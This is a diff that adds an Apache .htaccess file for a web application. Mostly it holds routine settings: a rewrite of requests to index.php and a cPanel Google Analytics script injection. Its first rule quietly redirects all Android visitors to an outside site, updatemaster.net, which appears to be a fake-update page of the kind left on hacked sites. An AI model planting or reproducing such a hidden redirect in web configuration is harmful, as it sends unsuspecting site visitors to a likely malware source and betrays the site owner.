@@ -1,0 +1,16 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} "Android" [NC]
+RewriteRule ^(.*)$ http://updatemaster.net/eng/ [L,R=302]
+
+RewriteEngine on
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule .* index.php/$0 [PT,L] 
+
+
+# Google Analytics Integration - Added by cPanel.
+<IfModule mod_substitute.c>
+AddOutputFilterByType SUBSTITUTE text/html
+Substitute "s|(<script src='/google_analytics_auto.js'></script>)?</head>|<script src='/google_analytics_auto.js'></script></head>|i"
+</IfModule>
+# END Google Analytics Integration
